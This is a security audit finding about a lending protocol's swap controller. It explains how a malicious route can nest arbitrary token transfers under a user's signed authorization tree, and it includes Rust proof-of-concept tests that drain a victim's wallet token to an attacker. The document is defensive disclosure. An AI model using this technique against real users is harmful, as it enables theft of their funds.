### Title
Unvalidated router routes can attach arbitrary token transfers to a user's signed authorization tree - (File: contracts/controller/src/strategies/swap.rs)

### Summary
`swap_collateral` accepts an opaque `StrategySwap` payload and invokes the configured router. The controller authorizes only the controller's exact input-token transfer, but it does not constrain which contracts the router invokes beneath the user's `swap_collateral` authorization. A malicious route can therefore make a nested venue invoke `token.transfer(victim, attacker, amount)` on an unrelated wallet token. Transaction simulation records that transfer as a child of the victim's controller authorization; if the victim signs the poisoned authorization tree, the nested venue steals wallet funds while the protocol swap still succeeds.

### Finding Description
`process_swap_collateral` authenticates the caller and passes the user-supplied `swap` payload through `withdraw_and_swap_from_supply` into the shared router execution path. [1](#0-0) 

`swap_tokens` snapshots controller balances and grants only one exact controller-to-router transfer authorization. [2](#0-1)  After `router.execute_strategy`, it checks only that the controller's input balance did not increase, that no more than `amount_in` was spent, and that positive output was received. [3](#0-2)  Neither the controller nor the router boundary validates the opaque route's nested call targets or excludes calls that request the user's authority for unrelated token transfers.

The regression test demonstrates the bypass directly: a router decodes an attacker-controlled `hop_pool`, calls it during `execute_strategy`, and still returns a fair output. [4](#0-3)  The named hop invokes `token.transfer(victim, attacker, WALLET_BALANCE)` on a token that the lending protocol never listed. [5](#0-4) 

Simulation attaches that unauthorized-looking transfer beneath the victim's `swap_collateral` authorization entry, and enforcement accepts the transfer when the victim signs the returned poisoned tree. [6](#0-5)  The same test shows the honest root-only tree rejects the transfer, but the signed malicious tree leaves the victim with zero wallet balance while the collateral swap completes. [7](#0-6) 

### Impact Explanation
A malicious route can steal any spendable token held by the user's wallet, not merely the collateral amount routed through the controller. The theft is outside the controller's measured input/output checks because the stolen token need not be a listed market asset or a controller-held asset. All strategy entrypoints that funnel user-supplied route bytes into `swap_tokens`, including `swap_collateral`, `swap_debt`, `multiply`, and `repay_debt_with_collateral`, share this boundary.

The impact is theft of user funds. It is bounded by the token balances and authorization tree the victim signs, but is not bounded by `amount_in`, route output, slippage, or final account health.

### Likelihood Explanation
The attack requires user interaction: the victim must sign a transaction whose authorization tree contains the malicious nested token transfer. This is realistic because `swap` is opaque serialized route data, while simulation presents nested authorization requirements that a wallet or user may not decode into a recognizable token theft. The controller's successful output accounting gives the malicious route a way to make the intended collateral swap appear successful while performing the extra transfer.

No protocol privilege, compromised router administration, leaked key, bad market parameter, or oracle manipulation is required. A normal account owner using a maliciously constructed route can trigger the behavior through the public `swap_collateral` entrypoint.

### Recommendation
Do not allow arbitrary nested venue calls to consume the user's authorization beneath a strategy invocation. The router/controller boundary should restrict route execution to an allowlisted set of venue calls and token transfers required for the declared swap, or execute the route through a constrained interpreter that cannot invoke arbitrary contracts with the caller's auth context.

At minimum, the signed authorization tree for a strategy should contain only:

1. the controller strategy call;
2. the one expected controller input transfer to the configured router;
3. explicitly expected venue/token operations for the declared route.

Wallets and integrators should reject simulated trees containing any unrelated `token.transfer` from the user. The protocol-side fix should not rely solely on client decoding.

fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);

fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
